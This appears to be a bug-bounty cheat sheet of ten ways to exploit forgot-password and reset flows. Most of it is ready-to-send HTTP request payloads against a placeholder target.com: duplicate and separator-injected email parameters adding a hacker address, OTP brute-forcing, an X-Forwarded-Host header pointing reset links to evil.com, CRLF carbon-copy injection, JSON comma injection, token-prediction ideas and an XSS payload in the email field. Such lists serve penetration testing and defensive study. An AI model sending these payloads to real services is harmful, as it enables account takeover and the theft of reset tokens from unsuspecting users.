## Forgot Password Functionality

## Introduction
Some common bugs in the forgot password / reset password functionality

## How to exploit
1. Parameter pollution
```
POST /reset HTTP/1.1
Host: target.com
...

email=victim@mail.com&email=hacker@mail.com
```

2. Bruteforce the OTP code
```
POST /reset HTTP/1.1
Host: target.com
...

email=victim@mail.com&code=$123456$
```

3. Host header Injection
```
POST /reset HTTP/1.1
Host: target.com
...

email=victim@mail.com
```
to
```
POST /reset HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
...

email=victim@mail.com
```
And the victim will receive the reset link with evil.com

4. Using separator in value of the parameter
```
POST /reset HTTP/1.1
Host: target.com
...

email=victim@mail.com,hacker@mail.com
```
```
POST /reset HTTP/1.1
Host: target.com
...

email=victim@mail.com%20hacker@mail.com
```
```
POST /reset HTTP/1.1
Host: target.com
...

email=victim@mail.com|hacker@mail.com
```
```
POST /reset HTTP/1.1
Host: target.com
...

email=victim@mail.com%00hacker@mail.com
```

5. No domain in value of the paramter
```
POST /reset HTTP/1.1
Host: target.com
...

email=victim
```

6. No TLD in value of the parameter
```
POST /reset HTTP/1.1
Host: target.com
...

email=victim@mail
```

7. Using carbon copy
```
POST /reset HTTP/1.1
Host: target.com
...

email=victim@mail.com%0a%0dcc:hacker@mail.com
```

8. If there is JSON data in body requests, add comma
```
POST /newaccount HTTP/1.1
Host: target.com
...

{"email":"victim@mail.com","hacker@mail.com","token":"xxxxxxxxxx"}
```

9. Find out how the tokens generate
- Generated based on TimeStamp
- Generated based on the ID of the user
- Generated based on the email of the user
- Generated based on the name of the user

10. Try Cross-Site Scripting (XSS) in the form

Sometimes the email is reflected in the forgot password page, try to use XSS payload
```
"<svg/onload=alert(1)>"@gmail.com
```
## References
* [anugrahsr](https://anugrahsr.github.io/posts/10-Password-reset-flaws/)
* [Frooti](https://twitter.com/HackerGautam/status/1502264873287569414)